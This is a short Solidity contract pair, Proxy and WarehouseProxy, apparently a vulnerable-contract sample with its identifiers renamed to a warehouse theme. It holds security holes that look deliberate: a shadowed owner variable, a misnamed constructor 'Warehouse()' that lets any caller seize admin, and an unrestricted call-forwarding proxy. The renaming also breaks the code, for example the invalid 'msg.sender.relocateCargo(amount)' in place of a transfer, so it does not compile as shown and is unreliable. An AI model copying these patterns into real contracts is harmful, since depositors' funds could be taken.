// SPDX-License-Identifier: MIT
pragma solidity ^0.4.23;

contract Proxy  {
    modifier onlyDepotowner { if (msg.sender == LogisticsAdmin) _; } address LogisticsAdmin = msg.sender;
    function relocatecargoDepotowner(address _depotowner) public onlyDepotowner { LogisticsAdmin = _depotowner; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract WarehouseProxy is Proxy {
    address public LogisticsAdmin;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Warehouse() public payable {
        if (msg.sender == tx.origin) {
            LogisticsAdmin = msg.sender;
            warehouseItems();
        }
    }

    function warehouseItems() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function shipItems(uint256 amount) public onlyDepotowner {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.relocateCargo(amount);
        }
    }
}